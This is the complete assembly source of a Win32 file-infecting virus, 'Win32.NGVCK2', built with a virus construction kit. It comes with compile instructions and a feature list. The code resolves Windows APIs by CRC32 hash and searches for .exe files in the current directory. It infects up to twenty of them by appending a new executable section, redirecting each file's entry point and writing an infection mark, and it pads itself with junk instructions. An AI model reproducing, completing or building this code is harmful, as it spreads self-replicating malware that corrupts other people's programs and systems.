              
;
;
; Win32.NGVCK2 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK2
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 25
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
                                        ; add esp, 4
 add esp, 4d
 mov eax, dword ptr [esp-4]
                                        ; mov ebp, eax
 push eax
 pop ebp
 jmp KernelSearchStart


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp edx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edx], 'ZM'
 je Goodfile
                                        ; mov ecx, 9256
 mov ecx, 9256d
 or ecx, ecx
 jnz Notagoodfile
Goodfile:
                                        ; clear ecx
 xor ecx, ecx
 mov cx, word ptr [edx+3Ch]
 or ecx, ecx
 jz Notagoodfile
                                        ; clear ecx
 mov ecx, 22076d
 sub ecx, 22076d
 add ecx, dword ptr [edx+3Ch]
                                        ; check if header lies inside the file
 cmp ecx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add ecx, edx
                                        ; check for PE Header
                                        ; check for EP
 movzx ebx, word ptr [ecx]
 cmp ebx, 'EP'
 je Goodfile2
                                        ; clear eax
 mov eax, -63874d
 add eax, 63874d
 cmp eax, 0
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear eax
 push 0
 pop eax

 push eax
 push eax
 push 3h
 push eax
                                        ; add eax, 1
 inc eax
 push eax
 mov eax, 80000000h or 40000000h
 push eax
 lea edi, [ebp+WFD_szFileName]

 push edi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; mov ecx, -1
 mov ecx, -1d
 and ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 push 0
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
 dec eax
 add eax, 1
 jz CloseFile
                                        ; clear edx
 xor edx, edx
 push ecx
 push edx
 push edx
                                        ; mov ebx, 2
 push 2d
 pop ebx
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 add eax, -1
 inc eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;        [ ///// * Retrieve non Kernel API's * \\\\\ ]

GetOtherApis:
 push ecx 
 push edx 
 push ecx
 call dword ptr [ebp+XLoadLibraryA]
 pop edx 
 pop ecx 
                                        ; mov ecx, eax
 push eax
 pop ecx
GetOtherApiLoop:
 add dword ptr [ebp+Trash1], 1024423    ; Trash
 push ecx 
 push edx 
 push ebx
 push ecx
 call dword ptr [ebp+XGetProcAddress]
 pop edx 
 pop ecx 
 mov dword ptr [edi], eax
                                        ; add edi, 4
 dec edi
 add edi, 5d
 dec edx
                                        ; add edx, 1
 add edx, 1d
 dec edx
 jz GetOtherApiEnd
GetOtherApiLoop2:
                                        ; add ebx, 1
 inc ebx
 cmp byte ptr [ebx], 0
 jne GetOtherApiLoop2
                                        ; add ebx, 1
 sub ebx, -1d
 jmp GetOtherApiLoop
GetOtherApiEnd:
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ecx, esi
 add ecx, [esi+3Ch]
                                        ; get File Alignment
 mov eax, [ecx+3Ch]
 mov dword ptr [ebp+filealign], eax
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], ebx
                                        ; get old Entrypoint
 mov eax, dword ptr [ebx+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov edx, dword ptr [ebx+34h]
 ror eax, 23d                           ; Trash
 mov dword ptr [ebp+OldBase], edx
 mov edx, [ebx+38h]
 mov dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov ecx, [ebx+74h]
 shl ecx, 3
                                        ; clear edx
 mov edx, 0
 mov dx, word ptr [ebx+6h]
 mov eax, 28h
 pushad
 mov eax, edx
 mul eax
 mov dword ptr [ebp+Misc1], eax
 popad
 mov edx, dword ptr [ebp+Misc1]
 add ebx, 78h
 add ebx, ecx
 add ebx, edx
 lea eax, [ebp+newsection]
 xchg ecx, eax


 xchg ecx, ebx
 push ecx
                                        ; Calculate the RVA of the new section
 mov edx, [ecx-5*8+8d]
 add edx, [ecx-5*8+12d]
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], edx
 mov eax, ecx                           ; Trash
 mov dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+nsphysicalsize], edx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], edx
                                        ;  calculate the virtual size of the new section
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], ebx
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop edx
 mov dword ptr [ebp+nsvirtualsize], edx
                                        ; calculate physical offset
 mov edx,[ecx-5*8+20d]
 add edx,[ecx-5*8+16d]
 mov ebx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], ebx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], -1
 and dword ptr [ebp+nsphysicaloffset], edx
                                        ; calculate new size
 mov eax, dword ptr [ebp+filealign]
 mov ecx, edx
 add ecx, VirusSize
 push eax
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ecx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 add dword ptr [ebp+Trash1], 1770239    ; Trash
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
                                        ; mov ecx, 16
 mov ecx, ( 16d + 37d )
 sub ecx, 37d
 pop ebx
 lea eax, [ebp+newsection]

WriteNewSectionLoop:
 mov edx, dword ptr [eax]
 mov dword ptr [ebx], edx
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
                                        ; add eax, 4
 add eax, 4d
 loop WriteNewSectionLoop
                                        ; increase section numbers
 push dword ptr [ebp+PEheader]
 pop eax
 sub word ptr [eax+06h], -1
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], 0
 xor dword ptr [ebp+NewEIP], ebx
                                        ; set new EIP
 mov dword ptr  [eax+28h], ebx
                                        ; set infection mark
 mov dword ptr [eax+4Ch], 0h
 add dword ptr [eax+4Ch], 'NGVC'
 push dword ptr [ebp+nsphysicaloffset]
 pop edx
 push edx
                                        ; Append Virus
 pop edi
 mov edx, VirusSize
 mov esi, ebp
 add esi, offset Virus

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
 cmp dword ptr [ebp+XCheckSumMappedFile], -1d
 je NoCheckSum
 lea ebx, [ebp+CheckSum]
 xchg eax, ebx

 push eax
 mov ecx, offset HeaderSum
 add ecx, ebp

 push ecx
 push dword ptr [ebp+NewSize]
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XCheckSumMappedFile]
                                        ; clear eax
 mov eax, -17193d
 add eax, 17193d
 xor eax, dword ptr [ebp+MapAddress]
 mov eax, [eax+3Ch]
 add eax, dword ptr [ebp+MapAddress]
 and dword ptr [ebp+Trash1], 1379078    ; Trash
                                        ; mov ecx, -1
 push -1d
 pop ecx
 and ecx, dword ptr [ebp+CheckSum]
 mov dword ptr [eax+58h], ecx
NoCheckSum:
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop ebx
 sub ebx, 1
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 pop eax
 stc
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 xor edx, edx
 mov ebx, dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignTemp], eax
 div ebx
 sub ebx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear eax
 and eax, 0
 add eax, [edx+78h]
 add eax, [ebp+KernelMZ]
                                        ; add eax, 28
 inc eax
 add eax, 27d
                                        ; get ATableVA
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
                                        ; add eax, 4
 add eax, 4d
 mov dword ptr [ebp+ATableVA], edx
                                        ; get NTableVA
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
 inc ecx                                ; Trash
 mov dword ptr [ebp+NTableVA], edx
                                        ; add eax, 4
 add eax, 4d
                                        ; get OTableVA
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
 push dword ptr [ebp+NTableVA]
 pop ecx


SearchNextApi1:                         ; search for the API's
 push ecx
 mov eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [ecx]
                                        ; mov ecx, eax
 push eax
 pop ecx
                                        ; mov edi, ecx
 mov edi, ecx
 mov dword ptr [ebp+TempApisearch2], edi
 push ebx
 pop dword ptr [ebp+TempApisearch3]
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov eax, dword ptr [ebp+APICRC32]
 sub eax, dword ptr [ebx]
                                        ; add eax, 1
 add eax, 1d
 dec eax
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop ecx
 mov edi, dword ptr [ebp+TempApisearch2]
 mov ebx, dword ptr [ebp+TempApisearch3]
                                        ; add ecx, 4
 add ecx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
 movzx ecx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 mov edx, ecx
 movzx ecx, word ptr [edx]
 shl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [ecx]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop esi
 dec esp
 sub esp, 3d
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop ecx
 adc edx, eax                           ; Trash

 mov dword ptr [ebp+retEIP], ecx

 neg edx                                ; Trash
 mov ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], ecx


                                        ; round to pages
 shr esi, 16d
 ror esi, 16d
                                        ; add esi, 1
 sub esi, -1d
GetKernelLoop:
                                        ; clear edx
 push 0
 pop edx
 sub esi, 1
 mov dx, word ptr [esi+03ch]
 cmp dx,0f800h
 je GetKernelLoop
 cmp esi, dword ptr [esi+edx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], esi
                                        ; add esi, 60
 dec esi
 add esi, 61d
 mov edx, [esi]
 sub esi, 60d
 add edx, esi
 mov [KernelPE+ebp], edx

 lea esi, [ebp+GetApis]
 xchg edi, esi

 push edi
ret

;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
                                        ; mov esi, 20
 push 20d
 pop esi
 mov dword ptr [ebp+InfCounter], esi
 lea ecx, [ebp+filemask]
 xchg edx, ecx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 sub eax, -1d
 or eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 dec edx
 add edx, 1
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; mov ebx, -1
 mov ebx, ( -1d xor 23d )
 xor ebx, 23d
 and ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost
 adc ecx, 54818085d                     ; Trash


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov edx, NumberOfApis

                                        ; load API Names and Offsets
 lea ecx, [ebp+APINames]
 xchg ebx, ecx

 lea ecx, [ebp+APIOffsets]
 xchg ecx, esi


GetApisLoop: 

                                        ; search 'em
                                        ; ebx points to the CRC
                                        ; esi points to the offset
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 call SearchAPI1
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 mov edi, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], edi
                                        ; add esi, 4
 inc esi
 add esi, 3d
 sub edx, 1
 jnz GetApisLoop
 lea eax, [ebp+Imagehlp]
 xchg ecx, eax

 mov edi, ebp
 add edi, offset XCheckSumMappedFile

                                        ; mov edx, 1
 mov edx, ( 1d xor 3d )
 xor edx, 3d
 lea ebx, [ebp+CheckSumMFA]

 call GetOtherApis
 jmp Outbreak



;          [ ///// * FindFiles Procedure * \\\\\ ]

 add ecx, edx                           ; Trash

FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg edi, edx
 and dword ptr [ebp+Trash1], 1441013    ; Trash

 push edi
 mov ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov edx, 276
 push 276d
 pop edx
 mov ebx, offset WFD_szFileName
 add ebx, ebp


ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 inc ebx
 dec edx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 xchg edi, esi
 dec ecx                                ; Trash

 push esi
 push edx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;                  [ ///// * Data * \\\\\ ]

Data:
 sectionalign   dd 0h
 InfCounter  dd 0h
 Imagehlp    db 'imagehlp.dll',0
 KernelMZ    dd 0h
 AlignTemp   dd 0h
 KernelPE    dd 0h
 filealign   dd 0h
 NTableVA    dd 0h
 CheckSum dd 0h
 counter     dw 0h
 OldBase     dd 400000h
 CheckSumMFA db 'CheckSumMappedFile',0
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

newsection:                           ; Settings for the new section
 nsname           db '.section'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 HeaderSum dd 0h
 APICRC32    dd 0h
 Trash1      dd 0h
 NewSize     dd 0h

 APIOffsets:
 XUnmapViewOfFile       dd 0h
 XCreateFileMappingA    dd 0h
 XGetProcAddress        dd 0h
 XMapViewOfFile         dd 0h
 XLoadLibraryA          dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XFindFirstFileA        dd 0h
 XCloseHandle           dd 0h
 XFindNextFileA         dd 0h

 db 'Virus : Win32.NGVCK2 Author : SnakeByte',0
 PEheader    dd 0h
 filemask    db '*.Exe',0
 TempApisearch3 dd 0h
 AlignReg2   dd 0h

 APINames:
 dd 094524B42h           ; UnmapViewOfFile
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0FFC97C1Fh           ; GetProcAddress
 dd 0797B49ECh           ; MapViewOfFile
 dd 04134D1ADh           ; LoadLibraryA
 dd 08C892DDFh           ; CreateFileA
 dd 0C200BE21h           ; FindClose
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 068624A9Dh           ; CloseHandle
 dd 0AA700106h           ; FindNextFileA

 NewEIP      dd 0h
 OTableVA    dd 0h
 OldEIP      dd 0h
 ATableVA    dd 0h
 MapHandle   dd 0h
 FindHandle  dd 0h
 XCheckSumMappedFile    dd 0h
 TempAPI     dd 0h
 FileHandle  dd 0h
 TempApisearch2 dd 0h
 AlignReg1   dd 0h
 MapAddress  dd 0h
 Misc1       dd 0h





;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx

 mov edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ecx,12345678h
 org $-4
 retBase dd 0h
 add ecx,12345678h
 org $-4
 retEIP dd 0h
 push ecx
ret



;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov esi, edi
 mov esi, edi
                                        ; mov eax, esi
 mov eax, esi
LenCRC:
                                        ; add eax, 1
 inc eax
 cmp byte ptr [eax], 0
 jne LenCRC
 sub eax, esi
                                        ; mov edi, eax
 mov edi, eax
                                        ; add edi, 1
 add edi, 1d
 cld
                                        ; clear ecx
 mov ecx, 0
 sub ecx, 1
                                        ; mov edx, ecx
 mov edx, ecx
NextByteCRC:
                                        ; clear eax
 and eax, 0
                                        ; clear ebx
 mov ebx, 9846d
 sub ebx, 9846d
 mov al, byte ptr [esi]
                                        ; add esi, 1
 inc esi
 xor al, cl
 mov cl, ch
 mov ch, dl
 mov dl, dh
 mov dh, 8
NextBitCRC:
 shr bx, 1
 rcr ax, 1
jnc NoCRC
 xor ax,08320h
 xor bx,0EDB8h
NoCRC:
 dec dh
jnz NextBitCRC
 xor ecx, eax
 xor edx, ebx
 dec edi
jnz NextByteCRC
 not edx
 not ecx
 mov eax, edx
 rol eax, 16d
 mov ax, cx
 mov dword ptr [ebp+APICRC32], eax
 popad
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

